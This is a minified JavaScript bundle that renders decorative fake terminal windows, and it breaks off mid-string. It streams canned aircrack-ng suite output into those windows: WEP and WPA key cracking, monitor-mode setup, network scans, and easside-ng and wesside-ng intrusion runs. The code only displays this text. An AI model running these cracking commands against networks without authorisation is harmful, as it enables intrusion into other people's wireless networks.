n.apply(this,arguments)}finally{P=t}}}},296:function(n,e,t){n.exports=t(813)}},e={};function t(r){var i=e[r];if(void 0!==i)return i.exports;var s=e[r]={exports:{}};return n[r](s,s.exports,t),s.exports}!function(){var n=t(791),e=t(164);function r(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function i(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function s(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?i(Object(t),!0).forEach((function(e){r(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}function a(n,e){(null==e||e>n.length)&&(e=n.length);for(var t=0,r=new Array(e);t<e;t++)r[t]=n[t];return r}function o(n,e){if(n){if("string"===typeof n)return a(n,e);var t=Object.prototype.toString.call(n).slice(8,-1);return"Object"===t&&n.constructor&&(t=n.constructor.name),"Map"===t||"Set"===t?Array.from(n):"Arguments"===t||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t)?a(n,e):void 0}}function l(n,e){return function(n){if(Array.isArray(n))return n}(n)||function(n,e){var t=null==n?null:"undefined"!==typeof Symbol&&n[Symbol.iterator]||n["@@iterator"];if(null!=t){var r,i,s=[],a=!0,o=!1;try{for(t=t.call(n);!(a=(r=t.next()).done)&&(s.push(r.value),!e||s.length!==e);a=!0);}catch(l){o=!0,i=l}finally{try{a||null==t.return||t.return()}finally{if(o)throw i}}return s}}(n,e)||o(n,e)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function c(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}function u(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}function d(n,e,t){return e&&u(n.prototype,e),t&&u(n,t),Object.defineProperty(n,"prototype",{writable:!1}),n}function f(n,e){var t=document.createElement("canvas").getContext("2d");t.font=n,t.textBaseline="middle",t.textAlign="center";var r=parseInt(t.measureText(e).width,10),i=parseInt(function(n,e){var t="font: "+n+";",r=document.getElementsByTagName("body")[0],i=document.createElement("div"),s=document.createTextNode(e);i.appendChild(s),i.setAttribute("style",t),r.appendChild(i);var a=i.offsetHeight;return r.removeChild(i),a}(n),10);return{fontWidth:r,fontHeight:i}}var p="monospace",_="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",g=function(){function n(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:_;c(this,n),this.fontmaps=[],this.letters=e}return d(n,[{key:"_generateFontMap",value:function(n,e,t,r){var i=document.createElement("canvas"),s=i.getContext("2d"),a="".concat(n,"px ").concat(p),o=f(a,this.letters[0]),l=o.fontWidth,c=o.fontHeight,u=this.letters.length*l,d=c;i.width=Math.floor(u*e),i.height=Math.floor(d*e),s.scale(e,e),s.fillStyle=r,s.fillRect(0,0,u,d),s.font=a,s.textBaseline="middle",s.textAlign="center",s.fillStyle=t;for(var _=0;_<this.letters.length;++_){var g=l*_+l/2,m=c/2;s.fillText(this.letters[_],g,m)}var h=s.getImageData(0,0,i.width,i.height),k=new Uint32Array(h.data.buffer);return{fontSize:n,scale:e,foreground:t,background:r,fontWidth:Math.floor(l*e),fontHeight:Math.floor(c*e),pixels:k,width:i.width,height:i.height,cache:{}}}},{key:"_getFontMap",value:function(n,e,t,r){var i,s=function(n,e){var t="undefined"!==typeof Symbol&&n[Symbol.iterator]||n["@@iterator"];if(!t){if(Array.isArray(n)||(t=o(n))||e&&n&&"number"===typeof n.length){t&&(n=t);var r=0,i=function(){};return{s:i,n:function(){return r>=n.length?{done:!0}:{done:!1,value:n[r++]}},e:function(n){throw n},f:i}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var s,a=!0,l=!1;return{s:function(){t=t.call(n)},n:function(){var n=t.next();return a=n.done,n},e:function(n){l=!0,s=n},f:function(){try{a||null==t.return||t.return()}finally{if(l)throw s}}}}(this.fontmaps);try{for(s.s();!(i=s.n()).done;){var a=i.value;if(a.fontSize===n&&a.scale===e&&a.foreground===t&&a.background===r)return a}}catch(c){s.e(c)}finally{s.f()}var l=this._generateFontMap(n,e,t,r);return this.fontmaps.push(l),l}},{key:"_generateFontPixels",value:function(n,e,t,r,i){for(var s=this._getFontMap(n,e,t,r),a=this.letters.indexOf(i)*s.fontWidth,o=new Uint32Array(s.fontWidth*s.fontHeight),l=0;l<s.fontHeight;++l){for(var c=0;c<s.fontWidth;++c)o[l*s.fontWidth+c]=s.pixels[a+c];a+=s.width}var u=o.buffer,d=s.fontWidth,f=s.fontHeight,p=new Uint32Array(u),_=new Uint8ClampedArray(u),g=new ImageData(_,d,f);return Object.freeze({fontWidth:d,fontHeight:f,uint32Array:p,uint8ClampedArray:_,imageData:g})}},{key:"getFontPixels",value:function(n,e,t,r,i){var s=this._getFontMap(n,e,t,r);return void 0===s.cache[i]&&(s.cache[i]=this._generateFontPixels(n,e,t,r,i)),s.cache[i]}},{key:"getFontDimension",value:function(n,e){var t=f("".concat(n,"px ").concat(p),this.letters[0]);return t.fontWidth=Math.floor(t.fontWidth*e),t.fontHeight=Math.floor(t.fontHeight*e),t}},{key:"getLetters",value:function(){return this.letters}}]),n}(),m=g,h=t(184);var k=function(e){var t,r,i,s,a,o,l,c,u,d=(0,n.useRef)(null),f=(0,n.useRef)(null),p=null!==(t=e.top)&&void 0!==t?t:0,_=null!==(r=e.left)&&void 0!==r?r:0,g=e.width,m=e.height,k=e.scale,b=null!==(i=e.titleBar)&&void 0!==i&&i,y=null!==(s=e.title)&&void 0!==s?s:"Window",S=null!==(a=e.titleColor)&&void 0!==a?a:"#0f0",v=null!==(o=e.background)&&void 0!==o?o:"#000",x=null!==(l=e.borderColor)&&void 0!==l?l:"#0f0",E=null!==(c=e.fontSize)&&void 0!==c?c:14,T=null!==(u=e.zIndex)&&void 0!==u?u:0,I={border:"".concat(1,"px solid ").concat(x),position:"absolute",top:"".concat(p,"px"),left:"".concat(_,"px"),width:"".concat(g+2+10,"px"),background:v,zIndex:T},w={font:"".concat(E,"px monospace"),color:S,padding:"".concat(5,"px"),paddingLeft:"10px"},N={padding:"".concat(5,"px")},C={width:"".concat(g,"px"),height:"".concat(m,"px"),display:"block"},P=(0,h.jsxs)("div",{style:I,children:[b&&(0,h.jsx)("div",{ref:f,style:w,children:y}),(0,h.jsx)("div",{style:N,children:(0,h.jsx)("canvas",{style:C,ref:d})})]});(0,n.useEffect)((function(){var n=d.current,e=n.getContext("2d");n.width=g*k,n.height=m*k,e.scale(k,k),e.fillStyle=v,e.fillRect(0,0,g,m)}),[g,m,k,v]);var L=function(){var n;return null===(n=d.current)||void 0===n?void 0:n.getContext("2d")};return Object.freeze({jsx:P,getCanvasContext:L,width:g,height:m,scale:k,putImageData:function(n,e,t){var r=L();r&&(n=-t.dirtyX+n,e=-t.dirtyY+e,r.putImageData(t.imageData,n,e,t.dirtyX,t.dirtyY,t.dirtyWidth,t.dirtyHeight))}})},b=function(){function n(e,t,r,i,s,a){c(this,n);var o=s.getFontDimension(r,i);this.layers=2,this.fontWidth=o.fontWidth,this.fontHeight=o.fontHeight,this.frameStart=0,this.frontWidth=t,this.frontHeight=e,this.backWidth=t,this.backHeight=e*this.layers,this.width=this.backWidth*this.fontWidth,this.height=this.backHeight*this.fontHeight,this.imageData=new ImageData(this.width,this.height),this.pixels=new Uint32Array(this.imageData.data.buffer),this.cursorX=0,this.cursorY=0,this.fontForeground="#0f0",this.fontBackground="#000",this.background=a,this.fontmap=s,this.fontSize=r,this.scale=i;for(var l=0;l<this.pixels.length;++l)this.pixels[l]=this.background}return d(n,[{key:"data",value:function(){return{dirtyX:0,dirtyY:this.frameStart*this.fontHeight,dirtyWidth:this.frontWidth*this.fontWidth,dirtyHeight:this.frontHeight*this.fontHeight,imageData:this.imageData}}},{key:"setColor",value:function(n,e){this.fontForeground=n,this.fontBackground=e}},{key:"renderStream",value:function(n){for(var e=0;e<n.length;++e){var t=n[e];if("\x1b"===t){for(var r="",i="";";"!==n[++e]&&"m"!==n[e];)r+=n[e];for(;"m"!==n[e];)i+=n[++e];i=i.length?i.substr(0,i.length-1):this.fontBackground,this.fontForeground=r,this.fontBackground=i}else"\n"===t?(this.cursorX=0,this.cursorY+=1,this._adjustCursorY()):(this._renderLetter(this.cursorX,this.cursorY,t),this.cursorX+=1,this.cursorX>=this.backWidth&&(this.cursorX=0,this.cursorY+=1,this._adjustCursorY()))}}},{key:"renderLetter",value:function(n,e,t){var r;(r=console).log.apply(r,arguments),this._renderLetter(n,this.frameStart+e,t)}},{key:"_renderLetter",value:function(n,e,t){for(var r=n*this.fontWidth,i=e*this.fontHeight,s=this.fontmap.getFontPixels(this.fontSize,this.scale,this.fontForeground,this.fontBackground,t).uint32Array,a=this.pixels,o=0,l=i*this.width+r,c=0;c<this.fontHeight;++c){for(var u=0;u<this.fontWidth;++u)a[l+u]=s[o+u];l+=this.width,o+=this.fontWidth}}},{key:"_adjustCursorY",value:function(){if(this.cursorY>=this.backHeight){for(var n=0,e=(this.frameStart+1)*this.fontHeight*this.width,t=(this.frontHeight-1)*this.fontHeight*this.width,r=(this.backHeight-(this.frontHeight-1))*this.fontHeight*this.width,i=0;i<t;++i)this.pixels[n]=this.pixels[e],n++,e++;for(var s=0;s<r;++s)this.pixels[n]=this.background,n++;this.cursorY=this.frontHeight-1,this.frameStart=0}else this.cursorY>=this.frontHeight&&(this.frameStart=this.cursorY-this.frontHeight+1)}}]),n}();function y(n,e,t,r,i){var s=i.getFontDimension(t,r),a=s.fontWidth,o=s.fontHeight;return{rows:Math.floor(e*r/o),cols:Math.floor(n*r/a)}}var S=function(e,t,r,i,s,a){var o=arguments.length>6&&void 0!==arguments[6]&&arguments[6],l=(0,n.useRef)(null);(0,n.useEffect)((function(){var n=e,c=t;if(!0===o){var u=y(e,t,r,i,s);n=u.rows,c=u.cols}var d=new b(n,c,r,i,s,a);l.current=d}),[e,t,r,i,s,a,o]);var c=function(n,e,t){l.current.renderLetter(n,e,t)},u=function(n){l.current.renderStream(n)},d=function(n,e){l.current.setColor(n,e)},f=function(){return l.current.data()};return Object.freeze({renderLetter:c,renderStream:u,setFontColor:d,data:f})};function v(n,e){if(e<n){var t=[e,n];n=t[0],e=t[1]}return Math.floor(Math.random()*(e-n+1))+n}function x(n){if(!(n.length<=0))return n[v(0,n.length-1)]}function E(n){for(var e=[],t=0;t<n.length;++t)"\n"===n[t]&&e.push(t);return e.length||e.push(-1),function(n){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0,t=n,r=n.length;return new Proxy({},{get:function(n,i,s){if("length"===i)return 1/0;var a=+i;return isNaN(a)||a<0||!r?void 0:t[(e+a)%r]}})}(n,x(e)+1)}var T={stringTo32Bit:function(n){if(3===(n=n.slice(1)).length){var e=n[0],t=n[1],r=n[2];n=e+e+t+t+r+r}var i=n.substr(0,2),s=n.substr(2,2),a=n.substr(4,2),o="0xff".concat(a).concat(s).concat(i);return Number(o)}},I=function(){function n(e){c(this,n),this.streams=e,this.index=0,this.streamIndex=0,this.elaspedTime=0,this.charsWritten=0}return d(n,[{key:"tick",value:function(n,e){if(this.index>=this.streams.length)return!1;e(this.streams[this.index].title),this.elaspedTime+=n;var t=this.streams[this.index].dt*(this.elaspedTime/1e3);t=Math.floor(t);for(var r=this.streams[this.index].stream,i=this.streamIndex,s="";this.charsWritten<t&&i<r.length;){if("\x1b"===r[i])for(;"m"!==r[i];)s+=r[i++];else++this.charsWritten;s+=r[i++]}return i>=r.length?(this.index++,this.streamIndex=0,this.elaspedTime=0,this.charsWritten=0):this.streamIndex=i,s}},{key:"quit",value:function(){return this.index>=this.streams.length}}]),n}();function w(e){var t=l((0,n.useState)("NULL"),2),r=t[0],i=t[1],a=k(s(s({},e),{},{title:r,titleBar:!0})),o=(0,n.useRef)(null),c=(0,n.useRef)(null),u=(0,n.useRef)(null),d=S(e.width,e.height,e.fontSize,e.scale,e.fontmap,T.stringTo32Bit(e.background),!0),f=function(){a.putImageData(0,0,d.data())},p=function(){if(e.shouldTick())if(c.current>=e.maxNumTicks)e.quit(e.id);else{var n=o.current.tick(e.tickTime,i,d);n.length&&(d.setFontColor(e.fontForeground,e.fontBackground),d.renderStream(n),u.current=window.requestAnimationFrame(f)),c.current+=1}};return(0,n.useEffect)((function(){o.current=new I(e.streams)}),[e.streams,e.scale]),(0,n.useEffect)((function(){c.current=0}),[e.tickTime,e.maxNumTicks]),(0,n.useEffect)((function(){var n=setInterval(p,e.tickTime);return function(){clearInterval(n),window.cancelAnimationFrame(u.current)}})),a.jsx}var N=(0,n.memo)(w),C=[{numCols:111,get streams(){return[{get title(){delete this.title;return this.title=x(["aircrack","terminal - aircrack"])},get stream(){return delete this.stream,this.stream=E('aircrack-ng -K 128bit.ivs\nOpening 128bit.ivs\nRead 684002 packets.\n\n#  BSSID              ESSID                     Encryption\n1  00:14:6C:04:57:9B                            WEP (684002 IVs)\n\nChoosing first network as target.\n\n                                            Aircrack-ng 1.4\n\n                            [00:00:10] Tested 77 keys (got 684002 IVs)\n\nKB    depth   byte(vote)\n0     0/  1   AE( 199) 29(  27) 2D(  13) 7C(  12) FE(  12) FF(   6) 39(   5) 2C(   3) 00(   0) 08(   0) \n1     0/  3   66(  41) F1(  33) 4C(  23) 00(  19) 9F(  19) C7(  18) 64(   9) 7A(   9) 7B(   9) F6(   9) \n2     0/  2   5C(  89) 52(  60) E3(  22) 10(  20) F3(  18) 8B(  15) 8E(  15) 14(  13) D2(  11) 47(  10) \n3     0/  1   FD( 375) 81(  40) 1D(  26) 99(  26) D2(  23) 33(  20) 2C(  19) 05(  17) 0B(  17) 35(  17) \n4     0/  2   24( 130) 87( 110) 7B(  32) 4F(  25) D7(  20) F4(  18) 17(  15) 8A(  15) CE(  15) E1(  15) \n5     0/  1   E3( 222) 4F(  46) 40(  45) 7F(  28) DB(  27) E0(  27) 5B(  25) 71(  25) 8A(  25) 65(  23) \n6     0/  1   92( 208) 63(  58) 54(  51) 64(  35) 51(  26) 53(  25) 75(  20) 0E(  18) 7D(  18) D9(  18) \n7     0/  1   A9( 220) B8(  51) 4B(  41) 1B(  39) 3B(  23) 9B(  23) FA(  23) 63(  22) 2D(  19) 1A(  17) \n8     0/  1   14(1106) C1( 118) 04(  41) 13(  30) 43(  28) 99(  25) 79(  20) B1(  17) 86(  15) 97(  15) \n9     0/  1   39( 540) 08(  95) E4(  87) E2(  79) E5(  59) 0A(  44) CC(  35) 02(  32) C7(  31) 6C(  30) \n10    0/  1   D4( 372) 9E(  68) A0(  64) 9F(  55) DB(  51) 38(  40) 9D(  40) 52(  39) A1(  38) 54(  36) \n11    0/  1   27( 334) BC(  58) F1(  44) BE(  42) 79(  39) 3B(  37) E1(  34) E2(  34) 31(  33) BF(  33) \n\n         KEY FOUND! [ AE:66:5C:FD:24:E3:92:A9:14:39:D4:27:4B ] \n\naircrack-ng -w h:hex.txt,ascii.txt -a 1 -n 64 -e teddy wep10-01.cap\n\n                                            Aircrack-ng 1.4 \n\n                            [00:00:00] Tested 2 keys (got 13 IVs)\n\nKB    depth   byte(vote)\n0    0/  0   00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) \n1    0/  0   00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) \n2    0/  0   00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) \n3    0/  0   00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) \n4    0/  0   00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) 00(   0) \n\n                     KEY FOUND! [ 12:34:56:78:90 ] \n    Probability: 100%\n\naircrack-ng -z ptw*.cap  \n\nOpening ptw-01.cap\nRead 171721 packets.\n  \n#  BSSID              ESSID                     Encryption\n\n1  00:14:6C:7E:40:80  teddy                     WEP (30680 IVs)\n\nChoosing first network as target.\n\n                                             Aircrack-ng 1.4\n\n                            [00:01:18] Tested 0/140000 keys (got 30680 IVs)\n\nKB    depth   byte(vote)\n0    0/  1   12( 170) 35( 152) AA( 146) 17( 145) 86( 143) F0( 143) AE( 142) C5( 142) D4( 142) 50( 140) \n1    0/  1   34( 163) BB( 160) CF( 147) 59( 146) 39( 143) 47( 142) 42( 139) 3D( 137) 7F( 137) 18( 136) \n2    0/  1   56( 162) E9( 147) 1E( 146) 32( 146) 6E( 145) 79( 143) E7( 142) EB( 142) 75( 141) 31( 140) \n3    0/  1   78( 158) 13( 156) 01( 152) 5F( 151) 28( 149) 59( 145) FC( 145) 7E( 143) 76( 142) 92( 142) \n4    0/  1   90( 183) 8B( 156) D7( 148) E0( 146) 18( 145) 33( 145) 96( 144) 2B( 143) 88( 143) 41( 141) \n\n                     KEY FOUND! [ 12:34:56:78:90 ] \n    Decrypted correctly: 100%\n\naircrack-ng -w password.lst *.cap\n\nOpening wpa2.eapol.cap\nOpening wpa.cap\nRead 18 packets.\n\n#  BSSID              ESSID                     Encryption\n\n1  00:14:6C:7E:40:80  Harkonen                  WPA (1 handshake)\n2  00:0D:93:EB:B0:8C  test                      WPA (1 handshake)\n\nIndex number of target network ? \n\n                             Aircrack-ng 1.4\n                             \n               [00:00:03] 230 keys tested (73.41 k/s)\n\n                       KEY FOUND! [ biscotte ]\n\n  Master Key     : CD D7 9A 5A CF B0 70 C7 E9 D1 02 3B 87 02 85 D6 \n                   39 E4 30 B3 2F 31 AA 37 AC 82 5A 55 B5 55 24 EE \n\n  Transcient Key : 33 55 0B FC 4F 24 84 F4 9A 38 B3 D0 89 83 D2 49 \n                   73 F9 DE 89 67 A6 6D 2B 8E 46 2C 07 47 6A CE 08 \n                   AD FB 65 D6 13 A9 9F 2C 65 E4 A6 08 F2 5A 67 97 \n                   D9 6F 76 5B 8C D3 DF 13 2F BC DA 6A 6E D9 62 CD \n\n  EAPOL HMAC     : 52 27 B8 3F 73 7C 45 A0 05 97 69 5C 30 78 60 BD \n\n~# airmon-ng\nPHY Interface   Driver      Chipset\n\nphy0    wlan0       ath9k_htc   Atheros Communications, Inc. AR9271 802.11n\n\n~# airmon-ng check\nFound 5 processes that could cause trouble.\nIf airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to kill (some of) them!\n\nPID Name\n718 NetworkManager\n870 dhclient\n1104 avahi-daemon\n1105 avahi-daemon\n1115 wpa_supplicant\n\n~# airmon-ng check kill\nKilling these processes:\n\nPID Name\n870 dhclient\n1115 wpa_supplicant\n\n~# airmon-ng start wlan0\nFound 5 processes that could cause trouble.\nIf airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to kill (some of) them!\n\nPID Name\n718 NetworkManager\n870 dhclient\n1104 avahi-daemon\n1105 avahi-daemon\n1115 wpa_supplicant\n\nPHY Interface   Driver      Chipset\n\nphy0    wlan0       ath9k_htc   Atheros Communications, Inc. AR9271 802.11n\n      (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)\n      (mac80211 station mode vif disabled for [phy0]wlan0)\n\n~# airmon-ng stop wlan0mon\nPHY Interface   Driver      Chipset\n\nphy0    wlan0mon    ath9k_htc   Atheros Communications, Inc. AR9271 802.11n\n      (mac80211 station mode vif enabled on [phy0]wlan0)\n      (mac80211 monitor mode vif disabled for [phy0]wlan0mon)\n\nlo        no wireless extensions.\n\neth0      no wireless extensions.\n\nwifi0     no wireless extensions.\n\nath0      IEEE 802.11b  ESSID:""  Nickname:""\n         Mode:Managed  Channel:0  Access Point: Not-Associated   \n         Bit Rate:0 kb/s   Tx-Power:0 dBm   Sensitivity=0/3  \n         Retry:off   RTS thr:off   Fragment thr:off\n         Encryption key:off\n         Power Management:off\n         Link Quality:0  Signal level:0  Noise level:0\n         Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0\n         Tx excessive retries:0  Invalid misc:0   Missed beacon:0\n\nInterface       Chipset         Driver\n\nwifi0           Atheros         madwifi-ng\nath0            Atheros         madwifi-ng VAP (parent: wifi0) (VAP destroyed)\nInterface       Chipset         Driver\nwifi0           Atheros         madwifi-ng\nath0            Atheros         madwifi-ng VAP (parent: wifi0) (monitor mode enabled)\n\nlo        no wireless extensions. \neth0      no wireless extensions.\nwifi0     no wireless extensions.\nath0      IEEE 802.11g  ESSID:""  \n      Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82   \n      Bit Rate=2 Mb/s   Tx-Power:18 dBm   Sensitivity=0/3  \n      Retry:off   RTS thr:off   Fragment thr:off\n      Encryption key:off\n      Power Management:off\n      Link Quality=0/94  Signal level=-96 dBm  Noise level=-96 dBm\n      Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0\n      Tx excessive retries:0  Invalid misc:0   Missed beacon:0\n\nroot@kali:~# airmon-ng --verbose\n\nNo LSB modules are available.\nDistributor ID: Kali\nDescription:    Kali GNU/Linux Rolling\nRelease:    2019.1\nCodename:   n/a\n\nLinux kali 4.19.0-kali4-amd64 #1 SMP Debian 4.19.28-2kali1 (2019-03-18) x86_64 GNU/Linux\nDetected VM using lspci\nThis appears to be a VMware Virtual Machine\nIf your system supports VT-d, it may be possible to use PCI devices\nIf your system does not support VT-d, you can only use USB wifi cards\n\nK indicates driver is from 4.19.0-kali4-amd64\nV indicates driver comes directly from the vendor, almost certainly a bad thing\nS indicates driver comes from the staging tree, these drivers are meant for reference not actual use, BEWARE\n? indicates we do not know where the driver comes from... report this\n\nX[PHY]Interface     Driver[Stack]-FirmwareRev       Chipset         Extended Info\nK[phy1]wlan0        ath9k_htc[mac80211]-1.4         Qualcomm Atheros Communications AR9271 802.11n            \n\nroot@kali:~# airmon-ng --debug\n\n/bin/sh -> /usr/bin/dash\n\nSHELL is GNU bash, version 5.0.3(1)-release (x86_64-pc-linux-gnu)\nCopyright (C) 2019 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\nNo LSB modules are available.\nDistributor ID: Kali\nDescription:    Kali GNU/Linux Rolling\nRelease:    2019.1\nCodename:   n/a\n\nLinux kali 4.19.0-kali4-amd64 #1 SMP Debian 4.19.28-2kali1 (2019-03-18) x86_64 GNU/Linux\nDetected VM using lspci\nThis appears to be a VMware Virtual Machine\nIf your system supports VT-d, it may be possible to use PCI devices\nIf your system does not support VT-d, you can only use USB wifi cards\n\nK indicates driver is from 4.19.0-kali4-amd64\nV indicates driver comes directly from the vendor, almost certainly a bad thing\nS indicates driver comes from the staging tree, these drivers are meant for reference not actual use, BEWARE\n? indicates we do not know where the driver comes from... report this\n\nX[PHY]Interface     Driver[Stack]-FirmwareRev       Chipset         Extended Info\n\ngetStack mac80211\ngetBus usb\ngetdriver() ath9k_htc\ngetchipset() Qualcomm Atheros Communications AR9271 802.11n\nBUS = usb\nBUSINFO = 0CF3:9271\nDEVICEID = \ngetFrom() K\ngetFirmware 1.4 \nK[phy1]wlan0        ath9k_htc[mac80211]-1.4         Qualcomm Atheros Communications AR9271 802.11n            \n\n~# airmon-ng stop wlan0mon\nPHY Interface   Driver      Chipset\n\nphy0    wlan0mon    ath9k_htc   Atheros Communications, Inc. AR9271 802.11n\n\nYou are trying to stop a device that isn\'t in monitor mode.\nDoing so is a terrible idea, if you really want to do it then you\nneed to type \'iw wlan2mon del\' yourself since it is a terrible idea.\nMost likely you want to remove an interface called wlan[0-9]mon\nIf you feel you have reached this warning in error,\nplease report it.\n\nCH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7E:40:80\n                                                                                                          \nBSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n                                                                                                          \n00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR                         \n00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP         bigbear \n00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy                            \n                                                                                                          \nBSSID              STATION            PWR   Rate   Lost  Packets  Notes  Probes\n                              \n00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14\n(not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy \n00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5\n00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy\n\nBSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # I\n00:1C:10:26:22:41, 2007-10-07 12:48:58, 2007-10-07 12:49:44,  6,  48, WEP , WEP,   , 171,      301,        0, \n00:1A:70:51:B5:71, 2007-10-07 12:48:58, 2007-10-07 12:49:44,  6,  48, WEP , WEP,   , 175,      257,        1, \n00:09:5B:7C:AA:CA, 2007-10-07 12:48:58, 2007-10-07 12:49:44, 11,  54, OPN ,    ,   , 189,      212,        0, \n\nStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n00:1B:77:7F:67:94, 2007-10-07 12:49:43, 2007-10-07 12:49:43, 178,        3, (not associated) ,\n\n\u201ctcpdump -n -vvv -e -s0 -r arp-request-dec\u201d\n\nreading from file arp-request-dec, link-type EN10MB (Ethernet)\n18:09:27.743303 00:0f:b5:ab:cb:9d > Broadcast, ethertype ARP (0x0806), length 42: arp who-has 192.168.1.100 te\n\n    Size: 68, FromDS: 0, ToDS: 1 (WEP)\n\n         BSSID  =  00:14:6C:7E:40:80\n     Dest. MAC  =  FF:FF:FF:FF:FF:FF\n    Source MAC  =  00:0F:B5:AB:CB:9D\n\n    0x0000:  0841 0201 0014 6c7e 4080 000f b5ab cb9d  .A....l~@.......\n    0x0010:  ffff ffff ffff 8001 6c48 0000 0999 881a  ........lH......\n    0x0020:  49fc 21ff 781a dc42 2f96 8fcc 9430 144d  I.!.x..B/....0.M\n    0x0030:  3ab2 cff5 d4d1 6743 8056 24ec 9192 c1e1  :.....gC.V$.....\n    0x0040:  d64f b709                                .O..\n\nUse this packet ? y\n\nSaving chosen packet in replay_src-0124-163529.cap\nYou should also start airodump-ng to capture replies.\nEnd of file.\n\neasside-ng -f ath0 -v 00:14:6C:7E:40:80 -c 9  -s 10.116.23.144\n\nSetting tap MTU\nSorting out wifi MAC\nMAC is 00:08:D4:86:7E:98\nSetting tap MAC\n[14:40:06.596419] Ownin...\n\nSSID teddy Chan 9 Mac 00:14:6C:7E:40:80\nSending auth request\nAuthenticated\nSending assoc request\nAssociated: 1\nAssuming ARP 54\n[14:40:13.537842] Got 22 bytes of PRGA IV [4B:02:00]\n[14:40:13.545021] Got 58 bytes of PRGA IV [4C:02:00]\n[14:40:13.648670] Got 166 bytes of PRGA IV [4D:02:00]\n[14:40:13.753087] Got 490 bytes of PRGA IV [4E:02:00]\n[14:40:13.863819] Got 1462 bytes of PRGA IV [4F:02:00]\n[14:40:13.966753] Got 1504 bytes of PRGA IV [50:02:00]\nAssuming ARP 36\n[15:23:42.047332] Guessing prga byte 22 with 16\nARP IP so far: 192\n[15:23:42.749330] Guessing prga byte 23 with 3F\nARP IP so far: 192.168\n[15:23:43.815329] Guessing prga byte 24 with 60\nARP IP so far: 192.168.1\nMy IP 192.168.1.123\nRtr IP 192.168.1.1\nSending who has 192.168.1.1 tell 192.168.1.123\nRtr MAC 00:14:6C:7E:40:80\nTrying to connect to buddy: 10.116.23.144:6969\nConnected\nHandshake compl33t\nChecking for internet... 1\nInternet w0rx.  Public IP 10.113.65.187\nRtt 77ms\n\n\nwesside-ng -i wlan0\n\n[13:51:32] Using mac 00:C0:CA:17:DB:6A\n[13:51:32] Looking for a victim...\n[13:51:32] Found SSID(teddy) BSS=(00:14:6C:7E:40:80) chan=9\n[13:51:32] Authenticated\n[13:51:32] Associated (ID=5)\n[13:51:37] Got ARP request from (00:D0:CF:03:34:8C)\n[13:51:37] Datalen 54 Known clear 22\n[13:51:37] Got 22 bytes of prga IV=(0e:4e:02) PRGA=A5 DC C3 AF 43 34 17 0D 0D 7E 2A C1 44 8A DA 51 A4 DF BB C6\n[13:51:37] Got 102 bytes of prga IV=(0f:4e:02) PRGA=17 03 74 98 9F CC FB AA A1 B3 5B 00 53 EC 8F C3 BB F7 56 2\n[13:51:37] Got 342 bytes of prga IV=(10:4e:02) PRGA=5C EC 18 24 F3 21 B2 74 2A 86 97 C7 4C 22 EC 42 00 3A C6 0\n[13:51:39] Guessing PRGA 8e (IP byte=230)    \n[13:51:39] Got clear-text byte: 192\n[13:51:40] Guessing PRGA be (IP byte=198)    \n[13:51:40] Got clear-text byte: 168\n[13:51:40] Guessing PRGA 8d (IP byte=47)     \n[13:51:40] Got clear-text byte: 1\n[13:51:40] Guessing PRGA 12 (IP byte=240)    \n[13:51:40] Got clear-text byte: 200\n[13:51:40] Got IP=(192.168.1.200)\n[13:51:40] My 